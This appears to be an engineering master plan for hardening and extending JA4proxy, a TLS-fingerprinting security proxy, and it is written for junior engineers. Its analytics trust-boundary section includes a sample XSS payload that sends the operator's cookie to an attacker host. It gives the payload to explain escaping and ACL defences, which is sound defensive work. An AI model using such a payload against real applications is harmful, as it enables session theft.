---
phase: 231
title: Container & Interface Consolidation — Master Implementation Plan
status: PROPOSED
size: XLARGE
created: 2026-06-12
audience: [junior-engineer, architect, operator]
dependencies: [230]
---

# Container & Interface Consolidation — Master Implementation Plan

> **Reading order for a junior engineer:**
> Read this document first (sections 1–5), then work through the individual
> phase documents in order: PHASE_232.md → PHASE_233.md → PHASE_234.md →
> PHASE_235.md → PHASE_236.md → PHASE_237.md → PHASE_238.md.
> Each of those documents is a complete, step-by-step guide for one piece
> of work. This document is the map; those are the turn-by-turn directions.

---

## 1. What This Programme Is Doing — And Why

JA4proxy is a security proxy that watches every TLS connection, computes a
"JA4 fingerprint" (a compact description of the client's TLS behaviour), scores
it for risk, and decides whether to allow, monitor, challenge, block, or tarpit
(deliberately slow down) the connection.

This programme fixes two categories of problem that Phase 230 identified:

### Category A — Security problems that exist right now

These are not future risks. They are things that are broken or dangerous today:

1. **A backdoor API with no access controls.** A second container called
   `admin-api` is running code from an old version of the codebase. That old
   code has NO authentication, NO role-based access control, and NO audit
   logging. Anyone who can reach the server on port 8091 can change the
   blocklist, clear bans, and modify security settings — without logging in.

2. **The Management Console loads JavaScript from the internet at runtime.**
   If the CDN (content delivery network) that serves the JavaScript is ever
   compromised, an attacker can inject malicious code into every operator's
   browser the next time they open the console. The published SRI (integrity)
   hashes that should prevent this are fake placeholder values — they are not
   checked.

3. **Production services are listening on all network interfaces.** The proxy
   metrics endpoint, the tarpit, and the analytics service all bind to
   `0.0.0.0` in the production compose file. This means anyone who can reach
   the server can connect to them directly — not just the services that are
   supposed to talk to them.

4. **The analytics container cannot talk to Redis in the development environment.**
   The analytics container and the Redis container are on different, isolated
   Docker networks. The analytics pipeline is completely untestable in the
   environment developers actually use. Production works (different network
   layout) but the bug goes unnoticed because nobody runs analytics tests
   in the POC environment.

### Category B — Operational visibility gaps that harm incident response

These are problems that make it harder for security engineers to do their jobs:

5. **The Management Console answers only ~20% of the questions an operator needs
   during an incident.** For example: "What are the top 10 IPs attacking us
   right now?" and "What has the analytics engine concluded?" have no answer in
   the current UI. The engineer has to open Redis CLI or Grafana to find out.

6. **Redis evictions silently un-block attackers.** When Redis runs low on
   memory, it starts deleting keys — including blocklist entries. An IP that
   was blocked may quietly become unblocked with no alert and no log entry.

7. **The analytics engine runs ML detection 24/7 but its findings are invisible.**
   Beaconing suspects, coordinated campaigns, statistical drift — all of these
   conclusions sit in Redis where no human ever reads them.

8. **Tarpit and analytics services have Prometheus metrics ports, but nothing
   scrapes them.** If either service goes down, no alert fires.

---

## 2. Glossary — Terms a Junior Engineer Might Not Know

**Alpine.js** — A small JavaScript library that makes HTML elements interactive.
You add `x-data`, `x-show`, `x-on:click` attributes to HTML and Alpine.js
handles the behaviour. Used in this project for interactive widgets (the dial,
confirmation modals).

**HTMX** — A library that lets HTML elements make HTTP requests and update parts
of the page without a full reload. In this project, `hx-get="/api/v1/partials/health-cards"
hx-trigger="every 10s"` means "every 10 seconds, fetch that URL and replace this
element with the response."

**Partial / Fragment** — A chunk of HTML (not a full page) returned by the server
for HTMX to insert into the page. The routes in `management/api/routes/partials.py`
all return partials.

**Jinja2** — The Python template engine used in this project. Templates live in
`management/templates/`. Jinja2 automatically escapes HTML characters
(`<`, `>`, `&`) to prevent cross-site scripting attacks.

**RBAC (Role-Based Access Control)** — A system where users are assigned roles
(auditor, analyst, operator, admin), and each role has a set of permissions.
An auditor can view data but not change it. An admin can do everything.

**Redis Stream** — A data structure in Redis (think: an append-only log). The
proxy writes every connection event to `ja4proxy:events` stream with XADD.
The management console reads it back with XRANGE/XREVRANGE.

**XADD** — The Redis command that adds an entry to a stream.
`XADD ja4proxy:events MAXLEN ~ 100000 * ip 1.2.3.4 score 87 action block`
adds a new event and trims the stream to approximately 100,000 entries.

**XREVRANGE** — Reads a stream in reverse (newest first). Used to get recent
events for the dashboard.

**Redis ZRANGEBYSCORE** — Reads entries from a sorted set where the score is
in a given range. Used for the triage queue ("give me all IPs with risk score
between 35 and 65").

**Prometheus** — A monitoring tool that periodically fetches metrics from
services ("scraping") and stores them. A "scrape target" is a service URL that
Prometheus checks on a schedule.

**SRI hash (Subresource Integrity)** — A checksum attached to an HTML `<script>`
tag. The browser verifies the downloaded script matches the hash before running
it. Protects against CDN compromise.

**Docker bridge network** — An isolated private network shared by containers
you choose. By default, containers on different bridge networks cannot talk
to each other. The POC compose has several networks (`ja4proxy-data`,
`ja4proxy-mgmt`, `ja4proxy-dmz`) and containers must be explicitly connected
to the networks they need.

**WCAG 2.1 AA** — A web accessibility standard. Level AA means the content is
accessible to most people with disabilities, including those with colour
blindness, motor impairments, and who use screen readers.

**ACL (Redis Access Control List)** — Rules that restrict what a Redis user
can do. An ACL can say "this user can only read and write keys starting with
`analytics:`" — they cannot touch `config:dial` or `ja4:blocklist`.

**CSP (Content Security Policy)** — An HTTP header (or HTML meta tag) that
tells the browser what resources it is allowed to load. `script-src 'self'`
means "only run JavaScript served from this same server" — CDN scripts are
blocked.

---

## 3. The Project Structure — Where Things Live

```
JA4proxy/
│
├── management/                    ← Management Console (Python/FastAPI)
│   ├── api/
│   │   ├── main.py                ← App entry point; mounts routers
│   │   ├── auth.py                ← JWT authentication; RBAC enforcement
│   │   ├── models.py              ← Pydantic models; Role enum
│   │   └── routes/
│   │       ├── pages.py           ← HTML page routes (GET /)
│   │       ├── partials.py        ← HTMX fragment routes (GET /api/v1/partials/*)
│   │       ├── connections.py     ← Connection/fingerprint API
│   │       ├── bans.py            ← Ban management API
│   │       ├── dial.py            ← Enforcement dial API
│   │       └── health.py          ← Health check API
│   ├── templates/
│   │   ├── base.html              ← Master layout; nav sidebar; JS includes
│   │   ├── dashboard.html         ← Dashboard page
│   │   ├── bans.html              ← Bans management page
│   │   └── partials/              ← HTMX fragment templates
│   │       ├── health_cards.html
│   │       ├── live_feed.html
│   │       └── dial_widget.html
│   └── static/                    ← Static files (CSS, JS)
│
├── src/
│   ├── analytics/                 ← Analytics engine (Python ML)
│   │   └── main.py
│   └── management/                ← LEGACY management app (admin-api) — DELETE
│       └── app.py
│
├── deploy/docker/
│   ├── docker-compose.poc.yml     ← Development/POC environment
│   ├── docker-compose.prod.yml    ← Production environment
│   ├── docker-compose.monitoring.yml ← Prometheus/Grafana/Loki stack
│   ├── Dockerfile.management      ← Builds the management container
│   └── Dockerfile.admin           ← Builds the LEGACY admin-api — DELETE
│
├── config/
│   ├── haproxy.cfg                ← HAProxy configuration
│   └── redis/redis.conf           ← Redis configuration
│
├── monitoring/
│   └── prometheus/
│       ├── prometheus.yml         ← Scrape targets
│       └── alerts.yml             ← Alert rules
│
├── tests/
│   ├── unit/                      ← Unit tests (no external services)
│   └── integration/               ← Integration tests (with Redis/compose)
│
├── docs/phases/                   ← Phase planning documents (this directory)
├── Makefile                       ← make test, make lint-phases, etc.
└── CHANGELOG.md                   ← Record of changes per phase
```

---

## 4. Current State vs. Target State

### What the stack looks like today

```
Internet
    │
    ▼
[HAProxy :443/:80]  ← TCP passthrough (preserves TLS ClientHello)
    │
    ▼
[Go Proxy :8080]    ← JA4 fingerprinting, risk scoring, action enforcement
    │   │
    │   └── writes events to ──► [Redis :6379]  ← blocklist, stream, config
    │                                │
    └── forwards blocked to ──► [Tarpit :8888]  │
                                                 │
[Analytics :8080] ◄── reads events from ─────────┘
    (ML engine — findings invisible)

[Management Console :8090]  ← UI and API
    └── reads/writes ──► [Redis]
    └── admin-api :8091 ← LEGACY app, no auth (DELETE THIS)

[Prometheus] ← scrapes proxy:9090, redis-exporter
    (does NOT scrape tarpit:9099 or analytics:8080)

[Grafana] ← reads Prometheus
[Loki] ← reads container logs
```

### What the stack should look like after Phase 238

```
Internet
    │
    ▼
[HAProxy :443/:80]  ← TCP passthrough (same, now CI-asserted)
    │
    ▼
[Go Proxy :8080]    ← same, metrics on 127.0.0.1:9090 (not 0.0.0.0)
    │   │
    │   └── XADD MAXLEN 100000 ──► [Redis :6379] ← same, now plain redis:7.4-alpine
    │                                    │  (analytics can only write analytics:* keys)
    └── blocked ──► [Tarpit :8888] ◄─────┘
                    metrics on 127.0.0.1:9099

[Analytics]  ─writes findings to analytics:*─► [Redis]
    (findings now visible in Management Console)

[Management Console :8090]  ← expanded: answers all 17 incident questions
    ├── Situation summary bar (10s poll)
    ├── Row 1: System health (all 6 services)
    ├── Row 2: Threat Posture (top IPs, top JA4, time window)
    ├── Row 3: Intelligence (analytics HIGH findings)
    ├── Row 4: Triage Queue (grey-zone IPs needing decisions)
    └── Row 5: Live Feed
    (admin-api GONE; JS served from /static/vendor/ not CDN)

[Prometheus] ← now also scrapes tarpit:9099, analytics:8080, management healthcheck
[Alertmanager] ← verified routing; new rules for eviction, services down
[Grafana] ← same, security flags now enabled
```

---

## 5. The Five Design Decisions

These decisions were made during Phase 231 planning. **Do not re-debate them
during implementation** — they are agreed. If implementation reveals a problem
with a decision, raise it as a Phase 231 amendment before changing course.

---

### Decision 1 — Situation Summary Bar

A sticky strip between the topbar and the first dashboard row. Always visible.
Provides the "30-second read" for an operator who has just been woken up.

**Three states:**
```
🟢 ● NOMINAL   0 blocks  ·  142 conn/min  ·  Dial: 0 — Monitor
🟠 ▲ ELEVATED  12 blocks in 5m  ·  892 conn/min  ·  Dial: 45
🔴 ✖ ACTIVE   47 blocks in 5m  ·  Top: 203.0.113.42 (score 94)  ·  Dial: 75
```

State rules:
- NOMINAL: zero blocks in the last 5 minutes
- ELEVATED: 1–9 blocks in the last 5 minutes
- ACTIVE: 10 or more blocks in the last 5 minutes

**Why shape AND colour?** Approximately 8% of males have red-green colour
blindness (deuteranopia). A red dot and a green dot look identical to them.
The circle (●), triangle (▲), and X (✖) shapes make the state readable
without relying on colour.

**How it works:** The `GET /api/v1/partials/situation` endpoint reads the last
5 minutes of the Redis event stream (XREVRANGE), counts block/tarpit events,
finds the top attacker, and returns a rendered HTML fragment. The dashboard
polls this endpoint every 10 seconds via HTMX.

**When the proxy is down:** The bar is replaced by a full-width red banner:
```
✖ PROXY UNREACHABLE — No JA4 fingerprinting. All traffic unscored.
  Last heartbeat: 8m 23s ago.  [View Runbook ↗]
```
The duration counter updates every second using a small JavaScript snippet.
The enforcement dial is disabled (read-only) while the proxy is unreachable —
changing it while the proxy is down creates confusion when the proxy restarts.

**Implemented in:** Phase 232

---

### Decision 2 — Proxy-Down Banner

See Decision 1 above. The proxy-down banner is part of the situation bar
implementation, not a separate feature. When `proxy_down_seconds > 60`, the
situation bar template renders the banner variant instead of the normal bar.

The trigger condition (60 seconds) was chosen to avoid false alarms during
normal container startup (which takes up to 30 seconds).

**Implemented in:** Phase 232

---

### Decision 3 — Redis Eviction Policy

**What NOT to do:** Do not set `maxmemory-policy noeviction`.
Under `noeviction`, when Redis runs out of memory, ALL write operations fail.
The proxy's XADD fails. The management console cannot add new blocks. Every
service that writes to Redis breaks simultaneously. This is worse than the
original problem (silent evictions).

**What to do instead:**
1. Cap the event stream at 100,000 entries using `XADD ... MAXLEN ~ 100000`.
   The stream is the main memory consumer. 100,000 events × ~200 bytes each
   ≈ 20 MB. This stays well within the 256 MB Redis memory budget.
2. Add a Prometheus alert rule: if `redis_evicted_keys_total` increases, fire
   a HIGH severity alert. An eviction means a security key was lost — this
   must wake someone up. But it must not prevent the system from writing.
3. Show the eviction count in the Management Console health card so operators
   can see it at a glance.

**Implemented in:** Phase 233

---

### Decision 4 — Confirmation Modal Standard Component

Every action that changes security state (block, tarpit, allow, unban) must
use a consistent in-page modal component — not `window.confirm()`.

**Why not `window.confirm()`?**
- Many enterprise Chrome/Firefox builds block popup dialogs by default.
- It shows no context (the operator cannot see the IP or current action while
  deciding).
- It records nothing to the audit log beyond "button clicked."

**The modal component (`/management/static/confirm-modal.js`) must:**
- Show the target IP/fingerprint and its current state in the modal.
- Show the proposed action and TTL.
- Require a `reason` field (minimum 10 characters) for block/tarpit/allow actions.
- Provide an optional ticket ID field (for enterprises with change management systems).
- Have a Confirm button that is **disabled until the reason field is filled**.
- For allowlist actions: show an explicit danger warning ("This IP will bypass
  ALL JA4 scoring").

**The undo toast (`/management/static/undo-toast.js`) must:**
- Appear immediately after any successful block/tarpit/ban with an Undo link.
- Stay visible for 30 seconds with a countdown.
- If Undo is clicked: fire a DELETE request to the ban endpoint and confirm
  the reversal with a success message.

**Per-action rules:**

| Action | TTL required? | Max TTL | Reason required? | Danger warning? |
|--------|:---:|:---:|:---:|:---:|
| Block | Yes | 30 days | Yes (≥10 chars) | No |
| Tarpit | Yes | 7 days | Yes (≥10 chars) | No |
| Allow (whitelist) | Yes | 90 days | Yes (≥10 chars) | YES |
| Dial change | No | — | No | Yes if increase >25 |

**Implemented in:** Phase 235

---

### Decision 5 — Analytics Confidence Tiers and Triage Queue

**Analytics confidence tiers:**

The analytics engine outputs a confidence score for each finding (0.0 to 1.0).
A finding with confidence 0.95 means the model is 95% sure this is genuine
malicious behaviour. A finding with confidence 0.5 is a coin flip.

We show different things depending on confidence:

| Tier | Threshold | Where shown |
|------|-----------|-------------|
| HIGH | ≥ 0.90 | Main dashboard Intelligence row |
| MEDIUM | 0.70–0.89 | Intelligence Review page only |
| LOW | < 0.70 | Intelligence Review page only |

**Why not show all findings on the dashboard?**
An analyst at 2 AM looking at a list of 50 "possible threats" (most of which
are wrong) will eventually stop reading the list. This is called "alert fatigue."
By showing only HIGH-confidence findings on the main dashboard, we ensure that
when something appears there, it deserves attention.

**False-positive dismissal:**
Every finding must have a "Dismiss" button (removes from dashboard for that
finding's TTL) and a "Mark FP" button (sends feedback to the analytics engine
to improve future scoring).

**The triage queue:**
The triage queue surfaces IPs that are in the "grey zone" — risk scores between
35 and 65, seen frequently but not enough to cross the automatic block threshold.
These are the IPs most likely to be sophisticated attackers deliberately staying
below detection limits.

Triage queue eligibility:
- Risk score between 35 and 65 (configurable via `config:triage_range` Redis key)
- Seen at least 50 times in the last 24 hours (configurable)
- Not currently on any list (allowlist, blocklist, watchlist)
- Score is stable or trending upward (a declining score means the threat is
  probably moving on)

Actions per triage queue entry: **Block | Watchlist | Dismiss for 4h**
- "Dismiss for 4h" means: "I've reviewed this IP and I'm comfortable leaving
  it in monitor mode. Don't show it to me again for 4 hours." This is essential
  — without a dismiss option, the same IPs recur every poll cycle.

**Implemented in:** Phase 234 (triage queue), Phase 236 (analytics findings)

---

## 6. The Analytics Trust Boundary

**This section describes a security requirement that must be understood before
Phase 236 is implemented. A junior engineer working on Phase 236 must read this.**

The proposed data flow is:

```
analytics engine ──XADD──► Redis (analytics:* keys) ──read──► Management Console ──render──► Browser
```

If the analytics container is ever compromised, an attacker controlling it
can write to Redis. We must limit what they can do.

### Attack 1: Blocklist poisoning
If analytics has write access to `ja4:blocklist`, a compromised analytics
container can add `<management_console_ip>` to the blocklist, locking the
operator out of the console during an incident.

**Mitigation:** Redis ACL — analytics user can only write `analytics:*` keys.

### Attack 2: XSS via analytics output
If the management console renders analytics text without escaping, a compromised
analytics engine can write `<script>document.location='https://attacker.com/?c='+document.cookie</script>`
to a finding description. The browser runs it when the operator views the dashboard.

Jinja2 auto-escapes HTML characters by default, so `<script>` becomes
`&lt;script&gt;` which is displayed as text. **However:** any new template
that renders analytics data must use `{{ value | e }}` (explicit escape) and
never `{{ value | safe }}` (which disables escaping). Schema validation (below)
provides defence-in-depth.

**Mitigation:** Redis ACL (limits blast radius) + schema validation before render + CSP header.

### Attack 3: Config manipulation
Analytics can write `config:dial` directly, bypassing the ±10 guard and MFA
enforcement that the management API enforces.

**Mitigation:** Redis ACL — analytics user has no write access to `config:*`.

### What "Redis ACL" means in practice
In `config/redis_acl.conf`, we define:
```
user analytics on >[ANALYTICS_PASSWORD] ~analytics:* +@read +@write -@admin
```
This means: "The `analytics` user can read/write any key starting with
`analytics:`. It cannot do anything that requires admin privileges (like
changing ACL rules)."

The analytics container gets `REDIS_USER=analytics` and `REDIS_PASSWORD=<secret>`
environment variables. The management container gets its own user with full access
to read `analytics:*` but not write to it.

---

## 7. Development Environment Quick Reference

All commands should be run from the repository root unless otherwise stated.

### Starting the POC stack
```bash
cd "$(git rev-parse --show-toplevel)"
docker compose -f deploy/docker/docker-compose.poc.yml up -d
```

### Checking container status
```bash
docker compose -f deploy/docker/docker-compose.poc.yml ps
```

### Viewing logs for a specific container
```bash
docker compose -f deploy/docker/docker-compose.poc.yml logs -f management
docker compose -f deploy/docker/docker-compose.poc.yml logs -f analytics
```

### Running the full test suite
```bash
cd "$(git rev-parse --show-toplevel)"
make test
```

### Running Python tests only (faster during development)
```bash
cd "$(git rev-parse --show-toplevel)"
.venv314/bin/python3 -m pytest tests/ -q --timeout=60
```

### Running Go tests
```bash
cd "$(git rev-parse --show-toplevel)"
GOROOT=/snap/go/current /snap/go/current/bin/go test ./...
```

### Linting phases (must always be zero violations)
```bash
cd "$(git rev-parse --show-toplevel)"
python3 scripts/lint-phases.py
```

### Accessing Redis CLI inside the container
```bash
docker compose -f deploy/docker/docker-compose.poc.yml exec redis redis-cli
```

### Checking what's in the event stream
```bash
docker compose -f deploy/docker/docker-compose.poc.yml exec redis redis-cli XLEN ja4proxy:events
docker compose -f deploy/docker/docker-compose.poc.yml exec redis redis-cli XREVRANGE ja4proxy:events + - COUNT 5
```

### GOROOT note
The Go toolchain on this host is installed via snap. Always use:
```bash
GOROOT=/snap/go/current /snap/go/current/bin/go <command>
```
Do not use the system `go` command — it points to a broken installation.

---

## 8. Python Coding Standards for This Project

Every Python file in this project must follow these rules.
**These are not suggestions — make test will fail if you violate them.**

### Never use f-strings in logging calls
```python
# WRONG — do not do this:
logger.info(f"Connection from {ip} with score {score}")

# CORRECT — use lazy formatting:
logger.info("Connection from %s with score %s", ip, score)
```
**Why?** f-strings evaluate the expression immediately, even if the log level
means the message would never be printed. Lazy formatting defers evaluation.
Also, if `ip` or `score` is somehow an object with a `__str__` that raises an
exception, f-strings crash the logging call; lazy formatting handles it gracefully.

### Catch specific exceptions
```python
# WRONG:
try:
    await redis.xadd(...)
except Exception as e:
    logger.error(f"Failed: {e}")

# CORRECT:
try:
    await redis.xadd(...)
except redis.ConnectionError as exc:
    logger.error("Redis connection failed during stream write: %s", exc)
except redis.ResponseError as exc:
    logger.warning("Redis rejected stream write (possible NOPERM): %s", exc)
```

### Every new .py file must pass ruff and mypy immediately
After creating a new file, run:
```bash
cd "$(git rev-parse --show-toplevel)"
python3 -m ruff check --select I001 --fix management/api/routes/my_new_file.py
python3 -m mypy management/api/routes/my_new_file.py
```
Fix all issues before committing. Do not let lint errors accumulate.

---

## 9. Phase Delivery Map

The programme is delivered in seven phases. Each has its own detailed document.
Read the phase document before starting that phase's implementation.

```
Phase 232 — Security Foundations & Quick Wins
├── Close backdoor (admin-api elimination)
├── Fix JS CDN dependency (vendor all scripts)
├── Fix production port bindings (0.0.0.0 → 127.0.0.1)
├── Fix analytics/Redis network gap in POC
├── Add Content-Security-Policy header
├── Implement situation summary bar
└── Implement proxy-down banner
    Document: docs/phases/complete/PHASE_232.md

Phase 233 — Observability Foundations
├── Add Prometheus scrape targets (tarpit:9099, analytics:8080)
├── Add alert rules (eviction, services down, management down)
├── Verify Alertmanager routing
├── Replace redis-stack with redis:7.4.0-alpine
├── Cap event stream with XADD MAXLEN 100000
└── Surface eviction count in health cards
    Document: docs/phases/PHASE_233.md

Phase 234 — Dashboard: Threat Posture & Infrastructure Rows
├── Fix RBAC UI gap (pass role to all templates)
├── Add Threat Posture row (Top 10 IPs/JA4, time window, action dist)
├── Add Infrastructure row (Redis memory, service states)
└── Add Triage Queue (grey-zone IPs needing decisions)
    Document: docs/phases/PHASE_234.md

Phase 235 — Fingerprint & IP Drill-Down Pages
├── Build confirmation modal Alpine.js component (Decision 4)
├── Build undo toast component
├── JA4 fingerprint detail page (/fingerprint/{ja4})
├── IP detail page (/ip/{ip})
└── Make live feed rows clickable
    Document: docs/phases/PHASE_235.md

Phase 236 — Analytics Intelligence Visibility
├── Redis ACL setup (analytics scoped to analytics:* only)
├── Analytics output writer module (src/analytics/output_writer.py)
├── Intelligence dashboard row (HIGH confidence only)
├── Intelligence Review page (MEDIUM/LOW findings)
└── FP dismissal and feedback flow
    Document: docs/phases/PHASE_236.md

Phase 237 — Operational Polish & Missing Workflows
├── Shift handover snapshot endpoint
├── Dial auto-revert (raise for N hours then revert)
├── CIDR range blocking support
├── Manual action attribution badge in live feed
└── TLS certificate expiry visibility
    Document: docs/phases/PHASE_237.md

Phase 238 — Accessibility Hardening & Infrastructure Docs
├── Shape+colour+text status indicators (WCAG 2.1 AA)
├── Focus rings on all nav links
├── ARIA live regions on polling components
├── Light mode (prefers-color-scheme: light)
├── Grafana security flags enabled
├── cAdvisor threat model document
├── HAProxy TCP mode CI assertion
└── axe-core accessibility scan passing
    Document: docs/phases/PHASE_238.md
```

---

## 10. Corrected Finding Register

*Phase 230 peer review corrected three errors in the original findings and
added four new ones. This register is the authoritative source for implementation
priority.*

### CRITICAL (fix in Phase 232)

**C-1 — admin-api is running the legacy insecure application**
Not just a duplicate — it runs `src.management.app` (no auth, no RBAC, no
audit logging). ANY call to port 8091 bypasses all security controls.
→ Eliminate in Phase 232.

**C-2 — Analytics cannot reach Redis in the POC compose**
`analytics` is on `ja4proxy-mgmt` only; `redis` is on `ja4proxy-data` only.
Analytics pipeline is untestable in development. Fix the network attachment.
→ Fix in Phase 232.

### HIGH (fix in Phase 232 or 233)

**H-1 — JS loaded from CDN with fake SRI hashes**
Three libraries share the identical fake hash `sha384-Y8N6e7v5p4v3i2o1n0m9l8k7j6h5g4f3d2s1a0`.
→ Vendor all JS in Phase 232.

**H-2 — Management Console answers ~20% of operational questions**
→ Dashboard expansion in Phase 234.

**H-3 — Redis evictions silently un-block IPs**
`allkeys-lru` means blocklist entries can be evicted when Redis is under
memory pressure. No alert, no log.
→ XADD MAXLEN + alert rule in Phase 233. Note: original Phase 230 recommendation
(noeviction) was WRONG — see Decision 3.

**H-4 — HAProxy stats invisible to Management Console**
→ Infrastructure row in Phase 234.

**H-5 — Analytics findings invisible to operators**
→ Intelligence row in Phase 236.

### MEDIUM (fix in Phase 233–235)

**M-1 — RBAC gap: role not passed to templates**
→ Phase 234 sub-task A.

**M-2 — redis-stack vs plain redis**
→ Replace in Phase 233.

**M-3 — Tarpit metrics unscraped (:9099)**
→ Phase 233.

**M-4 — Analytics metrics unscraped (:8080)**
→ Phase 233.

**M-5/6/7 — Production ports on 0.0.0.0**
Proxy :9090, tarpit :8888/:9099, analytics :8082.
→ Phase 232.

**M-8 — Grafana security flags disabled**
`GF_SECURITY_COOKIE_SECURE=false`, HSTS disabled.
→ Phase 238.

**M-9 — cAdvisor privilege footprint undocumented**
SYS_PTRACE + DAC_READ_SEARCH + /:/rootfs:ro = full host read access.
→ Document in Phase 238.

### CLOSED

**~~Finding 11 — HAProxy TLS mode ambiguous~~**
`haproxy.cfg` unambiguously shows `mode tcp` globally. HAProxy is a TCP
passthrough. JA4 fingerprinting is intact. A CI assertion is added in
Phase 238 to prevent future regression, but this is not an open finding.

---

## 11. Programme-Level Acceptance Criteria

The programme is complete when ALL of the following are true:

- [ ] All 14 open findings are closed (C-1, C-2, H-1 through H-5, M-1 through M-9).
- [ ] `admin-api` container and `deploy/docker/Dockerfile.admin` no longer exist.
- [ ] `grep -r "admin-api\|8091" deploy/` returns empty.
- [ ] All JS served from `/static/vendor/` — no CDN requests in browser Network tab.
- [ ] All production ports bound to `127.0.0.1:` prefix.
- [ ] Analytics cannot write to `config:*` or `ja4:*` Redis keys (verified by test).
- [ ] Management Console answers all 17 questions from the Phase 230 gap table.
- [ ] Triage queue surfaces grey-zone IPs and dismiss works.
- [ ] Confirmation modal used for all destructive actions (no `window.confirm()`).
- [ ] Undo toast appears after every block/tarpit/allow action.
- [ ] Analytics HIGH-confidence findings visible on dashboard.
- [ ] axe-core scan reports zero WCAG 2.1 AA violations on dashboard, bans, and IP detail pages.
- [ ] `make test` exits 0 after every phase.
- [ ] Phases 232–238 all marked COMPLETE in `docs/phases/manifest.yaml`.
- [ ] `python3 scripts/lint-phases.py` exits 0.

---

## 12. How to Raise Problems

If you are implementing one of the sub-phases and discover:

- A decision (1–5) is technically incorrect or impossible → raise it as a
  PHASE_231 amendment request in the phase notes. Do not change the decision
  unilaterally; document the conflict and ask for a review.

- A step in a phase document is unclear or missing information → add a comment
  to the phase document explaining what you discovered, and ask for clarification
  before proceeding.

- A finding is more or less severe than rated → note it in the phase close-out
  notes. Do not skip fixing it based on your own re-rating.

- `make test` is red before you start your phase (pre-existing failure) → do
  not proceed. Fix the pre-existing failure first and document it.

---

*Master Implementation Plan — Gemini, 2026-06-12*
*Co-Authored-By: Gemini <noreply@google.com>*
